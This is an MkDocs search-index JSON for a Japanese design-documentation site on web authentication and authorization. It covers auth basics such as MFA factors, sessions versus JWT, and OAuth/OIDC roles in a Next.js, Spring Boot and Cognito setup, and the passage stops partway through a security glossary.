{"config":{"lang":["ja"],"separator":"[\\s\\-\\.]","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u8a2d\u8a08\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8","text":"<p>\u3053\u306e\u30b5\u30a4\u30c8\u3067\u306f\u3001\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u306e\u8a2d\u8a08\u306b\u95a2\u3059\u308b\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u3092\u63d0\u4f9b\u3057\u3066\u3044\u307e\u3059\u3002</p>"},{"location":"#_2","title":"\ud83d\udcda \u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u4e00\u89a7","text":""},{"location":"#_3","title":"\u8a8d\u8a3c\u30fb\u8a8d\u53ef","text":"<p>Web\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306b\u304a\u3051\u308b\u8a8d\u8a3c\u30fb\u8a8d\u53ef\u306b\u95a2\u3059\u308b\u5305\u62ec\u7684\u306a\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u7fa4\u3067\u3059\u3002</p>"},{"location":"#_4","title":"\u57fa\u790e\u304b\u3089\u5b66\u3076","text":""},{"location":"#1","title":"1. \u6982\u8981","text":"<ul> <li>\u8a8d\u8a3c\u3068\u8a8d\u53ef\u306e\u9055\u3044</li> <li>\u30bb\u30c3\u30b7\u30e7\u30f3\u3068\u30c8\u30fc\u30af\u30f3\u306e\u57fa\u790e</li> <li>\u767b\u5834\u4eba\u7269\u3068\u5f79\u5272(OAuth/OIDC)</li> </ul>"},{"location":"#2-oauth-20-openid-connect","title":"2. OAuth 2.0 / OpenID Connect","text":"<ul> <li>\u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u8a73\u7d30</li> <li>\u30d5\u30ed\u30fc\u306e\u7a2e\u985e\u3068\u9078\u629e\u57fa\u6e96</li> <li>\u30c8\u30fc\u30af\u30f3\u306e\u7a2e\u985e\u3068\u4f7f\u3044\u5206\u3051</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6a5f\u80fd(PKCE\u3001state\u3001nonce)</li> </ul>"},{"location":"#3","title":"3. \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56","text":"<ul> <li>\u5178\u578b\u7684\u306a\u8105\u5a01\u3068\u5bfe\u7b56</li> <li>\u30c8\u30fc\u30af\u30f3\u7ba1\u7406\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9</li> <li>2025\u5e74\u306e\u6700\u65b0\u52d5\u5411</li> </ul>"},{"location":"#_5","title":"\u5b9f\u88c5","text":""},{"location":"#1_1","title":"1. \u5b9f\u88c5\u30ac\u30a4\u30c9","text":"<ul> <li>Next.js + Spring Boot + AWS Cognito</li> <li>BFF\u30d1\u30bf\u30fc\u30f3\u306b\u3088\u308b\u8a8d\u8a3c\u5b9f\u88c5</li> <li>\u901a\u4fe1\u30d5\u30ed\u30fc\u306e\u8a73\u7d30</li> <li>\u30b3\u30fc\u30c9\u4f8b\u3068\u30c1\u30a7\u30c3\u30af\u30ea\u30b9\u30c8</li> </ul>"},{"location":"#_6","title":"\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9","text":""},{"location":"#1_2","title":"1. \u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9","text":"<ul> <li>\u5404\u8a8d\u8a3c\u65b9\u5f0f\u306e\u8a73\u7d30\u89e3\u8aac</li> <li>\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u30d1\u30bf\u30fc\u30f3</li> <li>\u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853(PAR\u3001DPoP\u3001mTLS\u7b49)</li> <li>\u30ec\u30ac\u30b7\u30fc\u30b7\u30b9\u30c6\u30e0\u306e\u30e2\u30c0\u30ca\u30a4\u30bc\u30fc\u30b7\u30e7\u30f3</li> </ul>"},{"location":"#_7","title":"\ud83d\udca1 \u5b66\u7fd2\u306e\u9032\u3081\u65b9","text":""},{"location":"#_8","title":"\u521d\u5b66\u8005\u5411\u3051","text":"<ol> <li>\u6982\u8981 \u3067\u57fa\u672c\u6982\u5ff5\u3092\u7406\u89e3</li> <li>OAuth 2.0 / OIDC \u3067\u30d7\u30ed\u30c8\u30b3\u30eb\u3092\u5b66\u7fd2</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 \u3067\u8105\u5a01\u3068\u5bfe\u7b56\u3092\u628a\u63e1</li> <li>\u5b9f\u88c5\u30ac\u30a4\u30c9 \u3067\u5b9f\u88c5\u65b9\u6cd5\u3092\u7fd2\u5f97</li> </ol>"},{"location":"#_9","title":"\u5b9f\u88c5\u62c5\u5f53\u8005\u5411\u3051","text":"<ul> <li>\u5b9f\u88c5\u30ac\u30a4\u30c9 \u3092\u4e2d\u5fc3\u306b\u53c2\u7167</li> <li>\u5fc5\u8981\u306b\u5fdc\u3058\u3066 \u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9 \u3067\u8a73\u7d30\u3092\u78ba\u8a8d</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 \u3067\u30c1\u30a7\u30c3\u30af\u30ea\u30b9\u30c8\u3092\u6d3b\u7528</li> </ul>"},{"location":"#_10","title":"\u30a2\u30fc\u30ad\u30c6\u30af\u30c8\u5411\u3051","text":"<ul> <li>\u5305\u62ec\u7684\u30ea\u30d5\u30a1\u30ec\u30f3\u30b9 \u3067\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u30d1\u30bf\u30fc\u30f3\u3092\u691c\u8a0e</li> <li>OAuth 2.0 / OIDC \u3067\u6a19\u6e96\u4ed5\u69d8\u3092\u78ba\u8a8d</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 \u3067\u6700\u65b0\u52d5\u5411\u3092\u30ad\u30e3\u30c3\u30c1\u30a2\u30c3\u30d7</li> </ul>"},{"location":"#_11","title":"\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306b\u3064\u3044\u3066","text":"<p>\u3053\u306e\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306f MkDocs \u3092\u4f7f\u7528\u3057\u3066\u751f\u6210\u3055\u308c\u3066\u3044\u307e\u3059\u3002</p>"},{"location":"#_12","title":"\u30ed\u30fc\u30ab\u30eb\u3067\u306e\u95b2\u89a7\u65b9\u6cd5","text":"<p>\u8a73\u3057\u304f\u306f\u3001\u30ea\u30dd\u30b8\u30c8\u30ea\u306e README \u3092\u53c2\u7167\u3057\u3066\u304f\u3060\u3055\u3044\u3002</p>"},{"location":"auth-basics/","title":"\u8a8d\u8a3c\u30fb\u8a8d\u53ef\u306e\u57fa\u790e\u77e5\u8b58","text":"<p>\ud83d\udcda \u8a8d\u8a3c\u30fb\u8a8d\u53ef &gt; \u6982\u8981 \u672c\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u3067\u306f\u3001\u8a8d\u8a3c\u6a5f\u80fd\u3092\u7406\u89e3\u3059\u308b\u305f\u3081\u306e\u57fa\u790e\u77e5\u8b58\u3092\u307e\u3068\u3081\u3066\u3044\u307e\u3059\u3002\u8a8d\u8a3c\u3068\u8a8d\u53ef\u306e\u9055\u3044\u3001\u30bb\u30c3\u30b7\u30e7\u30f3\u3068\u30c8\u30fc\u30af\u30f3\u306e\u6bd4\u8f03\u3001OAuth/OIDC\u306b\u304a\u3051\u308b\u767b\u5834\u4eba\u7269\u306a\u3069\u3001\u8a8d\u8a3c\u6a5f\u80fd\u3092\u5b66\u3076\u4e0a\u3067\u306e\u571f\u53f0\u3068\u306a\u308b\u6982\u5ff5\u3092\u89e3\u8aac\u3057\u307e\u3059\u3002</p>"},{"location":"auth-basics/#_2","title":"\u95a2\u9023\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8","text":"<ul> <li>\u6b21\u306e\u30b9\u30c6\u30c3\u30d7: OAuth 2.0 / OpenID Connect - \u30d7\u30ed\u30c8\u30b3\u30eb\u306e\u8a73\u7d30</li> <li>\u5b9f\u88c5: \u5b9f\u88c5\u30ac\u30a4\u30c9 - Next.js + Spring Boot + Cognito</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3: \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u5bfe\u7b56 - \u8105\u5a01\u3068\u5bfe\u7b56</li> </ul>"},{"location":"auth-basics/#_3","title":"\u76ee\u6b21","text":"<ol> <li>\u8a8d\u8a3c\u3068\u8a8d\u53ef\u306e\u9055\u3044</li> <li>\u8a8d\u8a3c\u306e3\u8981\u7d20</li> <li>\u30bb\u30c3\u30b7\u30e7\u30f3\u3068\u30c8\u30fc\u30af\u30f3\u306e\u9055\u3044</li> <li>\u4e3b\u8981\u306a\u767b\u5834\u4eba\u7269</li> </ol>"},{"location":"auth-basics/#_4","title":"\u8a8d\u8a3c\u3068\u8a8d\u53ef\u306e\u9055\u3044","text":""},{"location":"auth-basics/#authentication","title":"\u8a8d\u8a3c(Authentication)\u3068\u306f","text":"<p>**\u300c\u3042\u306a\u305f\u306f\u8ab0\u3067\u3059\u304b?\u300d**\u3068\u3044\u3046\u554f\u3044\u306b\u7b54\u3048\u308b\u30d7\u30ed\u30bb\u30b9\u3002</p> <ul> <li>\u76ee\u7684: \u672c\u4eba\u78ba\u8a8d</li> <li>\u4f8b: \u30ed\u30b0\u30a4\u30f3\u3001\u30d1\u30b9\u30ef\u30fc\u30c9\u5165\u529b</li> <li>\u82f1\u8a9e: Authentication (AuthN)</li> </ul>"},{"location":"auth-basics/#authorization","title":"\u8a8d\u53ef(Authorization)\u3068\u306f","text":"<p>**\u300c\u3042\u306a\u305f\u306f\u4f55\u304c\u3067\u304d\u307e\u3059\u304b?\u300d**\u3068\u3044\u3046\u554f\u3044\u306b\u7b54\u3048\u308b\u30d7\u30ed\u30bb\u30b9\u3002</p> <ul> <li>\u76ee\u7684: \u6a29\u9650\u78ba\u8a8d</li> <li>\u4f8b: \u7ba1\u7406\u8005\u753b\u9762\u3078\u306e\u30a2\u30af\u30bb\u30b9\u3001\u30d5\u30a1\u30a4\u30eb\u306e\u7de8\u96c6\u6a29\u9650</li> <li>\u82f1\u8a9e: Authorization (AuthZ)</li> </ul>"},{"location":"auth-basics/#_5","title":"\u6bd4\u8f03\u8868","text":"\u9805\u76ee \u8a8d\u8a3c(Authentication) \u8a8d\u53ef(Authorization) \u554f\u3044 \u300c\u3042\u306a\u305f\u306f\u8ab0?\u300d \u300c\u3042\u306a\u305f\u306f\u4f55\u304c\u3067\u304d\u308b?\u300d \u76ee\u7684 \u8eab\u5143\u78ba\u8a8d \u6a29\u9650\u78ba\u8a8d \u30bf\u30a4\u30df\u30f3\u30b0 \u30a2\u30af\u30bb\u30b9\u6642(\u6700\u521d) \u30ea\u30bd\u30fc\u30b9\u64cd\u4f5c\u6642(\u90fd\u5ea6) \u4f8b \u30ed\u30b0\u30a4\u30f3\u3001\u30d1\u30b9\u30ef\u30fc\u30c9\u5165\u529b \u7ba1\u7406\u8005\u753b\u9762\u30a2\u30af\u30bb\u30b9\u3001\u30c7\u30fc\u30bf\u7de8\u96c6 \u5931\u6557\u6642 401 Unauthorized 403 Forbidden"},{"location":"auth-basics/#_6","title":"\u5b9f\u969b\u306e\u6d41\u308c","text":"<pre><code>sequenceDiagram\n    participant User as \u30e6\u30fc\u30b6\u30fc\n    participant App as \u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n    participant Resource as \u30ea\u30bd\u30fc\u30b9\n\n    User-&gt;&gt;App: 1. \u30ed\u30b0\u30a4\u30f3(\u8a8d\u8a3c)\n    App-&gt;&gt;User: \u8a8d\u8a3c\u6210\u529f\n    User-&gt;&gt;App: 2. \u7ba1\u7406\u753b\u9762\u306b\u30a2\u30af\u30bb\u30b9\n    App-&gt;&gt;App: 3. \u6a29\u9650\u30c1\u30a7\u30c3\u30af(\u8a8d\u53ef)\n    App-&gt;&gt;Resource: 4. \u30ea\u30bd\u30fc\u30b9\u53d6\u5f97\n    Resource-&gt;&gt;User: \u30c7\u30fc\u30bf\u8868\u793a</code></pre>"},{"location":"auth-basics/#3","title":"\u8a8d\u8a3c\u306e3\u8981\u7d20","text":"<p>\u591a\u8981\u7d20\u8a8d\u8a3c(MFA)\u3092\u7406\u89e3\u3059\u308b\u305f\u3081\u306e\u57fa\u790e\u3002</p>"},{"location":"auth-basics/#1-something-you-know","title":"1. \u77e5\u8b58\u8981\u7d20(Something You Know)","text":""},{"location":"auth-basics/#_7","title":"\u300c\u3042\u306a\u305f\u304c\u77e5\u3063\u3066\u3044\u308b\u3053\u3068\u300d","text":"<ul> <li>\u30d1\u30b9\u30ef\u30fc\u30c9</li> <li>PIN\u30b3\u30fc\u30c9</li> <li>\u79d8\u5bc6\u306e\u8cea\u554f</li> </ul> <p>\u30e1\u30ea\u30c3\u30c8: \u5b9f\u88c5\u304c\u7c21\u5358 \u30c7\u30e1\u30ea\u30c3\u30c8: \u5fd8\u308c\u308b\u3001\u6f0f\u3048\u3044\u306e\u30ea\u30b9\u30af</p>"},{"location":"auth-basics/#2-something-you-have","title":"2. \u6240\u6301\u8981\u7d20(Something You Have)","text":""},{"location":"auth-basics/#_8","title":"\u300c\u3042\u306a\u305f\u304c\u6301\u3063\u3066\u3044\u308b\u3082\u306e\u300d","text":"<ul> <li>\u30b9\u30de\u30fc\u30c8\u30d5\u30a9\u30f3</li> <li>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30ad\u30fc</li> <li>\u30ef\u30f3\u30bf\u30a4\u30e0\u30d1\u30b9\u30ef\u30fc\u30c9(OTP)\u30c8\u30fc\u30af\u30f3</li> <li>IC\u30ab\u30fc\u30c9</li> </ul> <p>\u30e1\u30ea\u30c3\u30c8: \u7269\u7406\u7684\u306a\u76d7\u96e3\u304c\u5fc5\u8981 \u30c7\u30e1\u30ea\u30c3\u30c8: \u7d1b\u5931\u3001\u7834\u640d\u306e\u30ea\u30b9\u30af</p>"},{"location":"auth-basics/#3-something-you-are","title":"3. \u751f\u4f53\u8981\u7d20(Something You Are)","text":""},{"location":"auth-basics/#_9","title":"\u300c\u3042\u306a\u305f\u81ea\u8eab\u300d","text":"<ul> <li>\u6307\u7d0b</li> <li>\u9854\u8a8d\u8a3c</li> <li>\u8679\u5f69\u8a8d\u8a3c</li> <li>\u58f0\u7d0b</li> </ul> <p>\u30e1\u30ea\u30c3\u30c8: \u672c\u4eba\u4ee5\u5916\u4f7f\u7528\u56f0\u96e3 \u30c7\u30e1\u30ea\u30c3\u30c8: \u507d\u88c5\u306e\u53ef\u80fd\u6027\u3001\u30d7\u30e9\u30a4\u30d0\u30b7\u30fc\u61f8\u5ff5</p>"},{"location":"auth-basics/#mfa","title":"\u591a\u8981\u7d20\u8a8d\u8a3c(MFA)","text":"<p>**2\u3064\u4ee5\u4e0a\u306e\u8981\u7d20\u3092\u7d44\u307f\u5408\u308f\u305b\u308b**\u3053\u3068\u3067\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u3092\u5f37\u5316\u3002</p>"},{"location":"auth-basics/#_10","title":"\u826f\u3044\u7d44\u307f\u5408\u308f\u305b\u4f8b","text":"<ul> <li>\u2705 \u30d1\u30b9\u30ef\u30fc\u30c9(\u77e5\u8b58) + \u30b9\u30de\u30db\u30a2\u30d7\u30ea\u306eOTP(\u6240\u6301)</li> <li>\u2705 \u30d1\u30b9\u30ef\u30fc\u30c9(\u77e5\u8b58) + \u6307\u7d0b(\u751f\u4f53)</li> <li>\u2705 IC\u30ab\u30fc\u30c9(\u6240\u6301) + PIN(\u77e5\u8b58)</li> </ul>"},{"location":"auth-basics/#_11","title":"\u60aa\u3044\u7d44\u307f\u5408\u308f\u305b\u4f8b","text":"<ul> <li>\u274c \u30d1\u30b9\u30ef\u30fc\u30c9 + \u79d8\u5bc6\u306e\u8cea\u554f (\u4e21\u65b9\u3068\u3082\u77e5\u8b58\u8981\u7d20)</li> <li>\u274c \u6307\u7d0b + \u9854\u8a8d\u8a3c (\u4e21\u65b9\u3068\u3082\u751f\u4f53\u8981\u7d20)</li> </ul>"},{"location":"auth-basics/#_12","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u3068\u30c8\u30fc\u30af\u30f3\u306e\u9055\u3044","text":""},{"location":"auth-basics/#_13","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c","text":"<pre><code>graph LR\n    Browser[\u30d6\u30e9\u30a6\u30b6] --&gt;|Cookie: session_id| Server[\u30b5\u30fc\u30d0\u30fc]\n    Server --&gt;|\u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\u53d6\u5f97| SessionStore[(\u30bb\u30c3\u30b7\u30e7\u30f3\u30b9\u30c8\u30a2)]</code></pre>"},{"location":"auth-basics/#_14","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u306e\u7279\u5fb4","text":"<ul> <li>\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\u3092\u4fdd\u6301</li> <li>\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306b\u306f\u30bb\u30c3\u30b7\u30e7\u30f3ID\u306e\u307f\u9001\u4fe1</li> <li>\u30b5\u30fc\u30d0\u30fc\u306b\u72b6\u614b\u3092\u6301\u3064(Stateful)</li> </ul>"},{"location":"auth-basics/#_15","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u306e\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u2705 \u30b5\u30fc\u30d0\u30fc\u5074\u3067\u5373\u5ea7\u306b\u7121\u52b9\u5316\u53ef\u80fd</li> <li>\u2705 \u30bb\u30c3\u30b7\u30e7\u30f3\u60c5\u5831\u3092\u30b5\u30fc\u30d0\u30fc\u3067\u5b8c\u5168\u7ba1\u7406</li> <li>\u2705 CSRF\u5bfe\u7b56\u304c\u53ef\u80fd</li> </ul>"},{"location":"auth-basics/#_16","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u306e\u30c7\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u274c \u30b5\u30fc\u30d0\u30fc\u306b\u30b9\u30c8\u30ec\u30fc\u30b8\u304c\u5fc5\u8981</li> <li>\u274c \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u6642\u306b\u30bb\u30c3\u30b7\u30e7\u30f3\u5171\u6709\u304c\u5fc5\u8981</li> <li>\u274c \u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3067\u306eCookie\u7ba1\u7406\u304c\u8907\u96d1</li> </ul>"},{"location":"auth-basics/#jwt","title":"\u30c8\u30fc\u30af\u30f3\u30d9\u30fc\u30b9\u8a8d\u8a3c(JWT)","text":"<pre><code>graph LR\n    Browser[\u30d6\u30e9\u30a6\u30b6] --&gt;|Authorization: Bearer xxx| Server[\u30b5\u30fc\u30d0\u30fc]\n    Server --&gt;|\u30c8\u30fc\u30af\u30f3\u691c\u8a3c| Server</code></pre>"},{"location":"auth-basics/#_17","title":"\u30c8\u30fc\u30af\u30f3\u306e\u7279\u5fb4","text":"<ul> <li>\u7f72\u540d\u4ed8\u304d\u30c8\u30fc\u30af\u30f3\u3092\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\u3067\u4fdd\u6301</li> <li>\u30b5\u30fc\u30d0\u30fc\u306f\u72b6\u614b\u3092\u6301\u305f\u306a\u3044(Stateless)</li> <li>\u30c8\u30fc\u30af\u30f3\u81ea\u4f53\u306b\u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3092\u542b\u3080</li> </ul>"},{"location":"auth-basics/#jwt_1","title":"JWT\u306e\u69cb\u9020","text":"<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NSIsIm5hbWUiOiJKb2huIERvZSIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n\nHeader.Payload.Signature\n</code></pre> <ul> <li>Header: \u30a2\u30eb\u30b4\u30ea\u30ba\u30e0\u60c5\u5831</li> <li>Payload: \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3001\u6709\u52b9\u671f\u9650</li> <li>Signature: \u6539\u3056\u3093\u691c\u77e5\u7528\u306e\u7f72\u540d</li> </ul>"},{"location":"auth-basics/#_18","title":"\u30c8\u30fc\u30af\u30f3\u306e\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u2705 \u30b9\u30c6\u30fc\u30c8\u30ec\u30b9(\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u72b6\u614b\u4e0d\u8981)</li> <li>\u2705 \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\u304c\u5bb9\u6613</li> <li>\u2705 \u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9\u9593\u3067\u5171\u6709\u53ef\u80fd</li> <li>\u2705 \u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea\u3068\u76f8\u6027\u304c\u826f\u3044</li> </ul>"},{"location":"auth-basics/#_19","title":"\u30c8\u30fc\u30af\u30f3\u306e\u30c7\u30e1\u30ea\u30c3\u30c8","text":"<ul> <li>\u274c \u30c8\u30fc\u30af\u30f3\u306e\u5373\u5ea7\u306a\u7121\u52b9\u5316\u304c\u56f0\u96e3</li> <li>\u274c \u30c8\u30fc\u30af\u30f3\u30b5\u30a4\u30ba\u304c\u5927\u304d\u3044</li> <li>\u274c XSS\u653b\u6483\u3067\u30c8\u30fc\u30af\u30f3\u304c\u76d7\u307e\u308c\u308b\u30ea\u30b9\u30af</li> </ul>"},{"location":"auth-basics/#_20","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u3068\u30c8\u30fc\u30af\u30f3\u306e\u6bd4\u8f03","text":"\u9805\u76ee \u30bb\u30c3\u30b7\u30e7\u30f3 \u30c8\u30fc\u30af\u30f3(JWT) \u72b6\u614b Stateful Stateless \u4fdd\u5b58\u5834\u6240(\u30b5\u30fc\u30d0\u30fc) \u5fc5\u8981 \u4e0d\u8981 \u4fdd\u5b58\u5834\u6240(\u30af\u30e9\u30a4\u30a2\u30f3\u30c8) Cookie(ID \u306e\u307f) LocalStorage/Cookie(\u5168\u60c5\u5831) \u7121\u52b9\u5316 \u5373\u5ea7\u306b\u53ef\u80fd \u56f0\u96e3(\u6709\u52b9\u671f\u9650\u307e\u3067\u6709\u52b9) \u30b9\u30b1\u30fc\u30ea\u30f3\u30b0 \u30bb\u30c3\u30b7\u30e7\u30f3\u5171\u6709\u5fc5\u8981 \u5bb9\u6613 \u30b5\u30a4\u30ba \u5c0f(ID\u306e\u307f) \u5927(\u5168\u60c5\u5831) \u9069\u7528\u30b7\u30fc\u30f3 \u30e2\u30ce\u30ea\u30b9\u3001\u7ba1\u7406\u753b\u9762 SPA\u3001\u30de\u30a4\u30af\u30ed\u30b5\u30fc\u30d3\u30b9"},{"location":"auth-basics/#oauthoidc","title":"\u4e3b\u8981\u306a\u767b\u5834\u4eba\u7269(OAuth/OIDC)","text":""},{"location":"auth-basics/#4","title":"4\u3064\u306e\u5f79\u5272","text":"<pre><code>graph TB\n    User[\ud83d\udc64 \u30e6\u30fc\u30b6\u30fc&lt;br/&gt;\u30ea\u30bd\u30fc\u30b9\u30aa\u30fc\u30ca\u30fc]\n    Client[\ud83d\udcbb \u30af\u30e9\u30a4\u30a2\u30f3\u30c8&lt;br/&gt;\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u30a2\u30d7\u30ea]\n    AuthServer[\ud83d\udd10 \u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc/IdP&lt;br/&gt;AWS Cognito\u7b49]\n    ResourceServer[\ud83d\uddc4\ufe0f \u30ea\u30bd\u30fc\u30b9\u30b5\u30fc\u30d0\u30fc&lt;br/&gt;API\u30b5\u30fc\u30d0\u30fc]\n\n    User --&gt;|1. \u30ed\u30b0\u30a4\u30f3| AuthServer\n    AuthServer --&gt;|2. \u30c8\u30fc\u30af\u30f3\u767a\u884c| Client\n    Client --&gt;|3. \u30c8\u30fc\u30af\u30f3\u4ed8\u304d\u30ea\u30af\u30a8\u30b9\u30c8| ResourceServer\n    ResourceServer --&gt;|4. \u30c7\u30fc\u30bf\u8fd4\u5374| Client</code></pre>"},{"location":"auth-basics/#1","title":"1. \u30e6\u30fc\u30b6\u30fc(\u30ea\u30bd\u30fc\u30b9\u30aa\u30fc\u30ca\u30fc)","text":"<ul> <li>\u30a8\u30f3\u30c9\u30e6\u30fc\u30b6\u30fc\u3001\u5b9f\u969b\u306b\u30ed\u30b0\u30a4\u30f3\u3059\u308b\u4eba</li> <li>\u30ea\u30bd\u30fc\u30b9(\u30c7\u30fc\u30bf)\u306e\u6240\u6709\u8005</li> <li>\u4f8b: \u3042\u306a\u305f</li> </ul>"},{"location":"auth-basics/#2","title":"2. \u30af\u30e9\u30a4\u30a2\u30f3\u30c8","text":"<ul> <li>\u30e6\u30fc\u30b6\u30fc\u304c\u4f7f\u7528\u3059\u308b\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3</li> <li>\u8a8d\u8a3c\u30fb\u8a8d\u53ef\u3092\u8981\u6c42\u3059\u308b\u5074</li> <li>\u4f8b: Next.js \u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9\u3001React SPA\u3001\u30e2\u30d0\u30a4\u30eb\u30a2\u30d7\u30ea</li> </ul>"},{"location":"auth-basics/#3-idp-identity-provider","title":"3. \u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc / IdP (Identity Provider)","text":"<ul> <li>\u8a8d\u8a3c\u3092\u5b9f\u65bd\u3057\u3001\u30c8\u30fc\u30af\u30f3\u3092\u767a\u884c</li> <li>\u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3092\u7ba1\u7406</li> <li>\u4f8b: AWS Cognito, Auth0, Google, Microsoft Azure AD</li> </ul>"},{"location":"auth-basics/#4-api","title":"4. \u30ea\u30bd\u30fc\u30b9\u30b5\u30fc\u30d0\u30fc(API)","text":"<ul> <li>\u4fdd\u8b77\u3055\u308c\u305f\u30ea\u30bd\u30fc\u30b9\u3092\u63d0\u4f9b</li> <li>\u30c8\u30fc\u30af\u30f3\u3092\u691c\u8a3c\u3057\u3066\u30c7\u30fc\u30bf\u3092\u8fd4\u5374</li> <li>\u4f8b: Spring Boot API, Node.js API</li> </ul>"},{"location":"auth-basics/#_21","title":"\u5b9f\u969b\u306e\u30b7\u30b9\u30c6\u30e0\u3067\u306e\u5bfe\u5fdc","text":"<p>Next.js + Spring Boot + AWS Cognito \u306e\u5834\u5408:</p> \u5f79\u5272 \u5bfe\u5fdc\u3059\u308b\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8 \u30e6\u30fc\u30b6\u30fc \u30d6\u30e9\u30a6\u30b6\u3092\u64cd\u4f5c\u3059\u308b\u4eba \u30af\u30e9\u30a4\u30a2\u30f3\u30c8 Next.js \u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3 \u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc/IdP AWS Cognito \u30ea\u30bd\u30fc\u30b9\u30b5\u30fc\u30d0\u30fc Spring Boot API"},{"location":"auth-basics/#_22","title":"\u7528\u8a9e\u96c6","text":""},{"location":"auth-basics/#oauth-20","title":"OAuth 2.0\u95a2\u9023","text":"\u7528\u8a9e \u8aac\u660e \u30b9\u30b3\u30fc\u30d7(Scope) \u30a2\u30af\u30bb\u30b9\u6a29\u9650\u306e\u7bc4\u56f2(\u4f8b: <code>read:profile</code>, <code>write:posts</code>) \u8a8d\u53ef\u30b3\u30fc\u30c9(Authorization Code) \u30c8\u30fc\u30af\u30f3\u53d6\u5f97\u306e\u305f\u3081\u306e\u4e00\u6642\u7684\u306a\u30b3\u30fc\u30c9 \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 API\u547c\u3073\u51fa\u3057\u306b\u4f7f\u7528\u3059\u308b\u77ed\u547d\u306e\u30c8\u30fc\u30af\u30f3 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3 \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3\u518d\u767a\u884c\u7528\u306e\u9577\u547d\u30c8\u30fc\u30af\u30f3 ID\u30c8\u30fc\u30af\u30f3(OIDC) \u30e6\u30fc\u30b6\u30fc\u60c5\u5831\u3092\u542b\u3080\u30c8\u30fc\u30af\u30f3"},{"location":"auth-basics/#_23","title":"\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u95a2\u9023","text":"\u7528\u8a9e \u8aac\u660e PKCE Proof Key for Code Exchange\u3001\u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a\u653b\u6483\u3092\u9632\u3050 CSRF Cross-Site Request Forgery\u3001\u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u30ea\u30af\u30a8\u30b9\u30c8\u30d5\u30a9\u30fc\u30b8\u30a7\u30ea XSS Cross-Site Scripting\u3001\u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u30b9\u30af\u30ea\u30d7\u30c6\u30a3\u30f3\u30b0 state CSRF\u5bfe\u7b56\u7528\u306e\u30e9\u30f3\u30c0\u30e0\u6587\u5b57\u5217 nonce 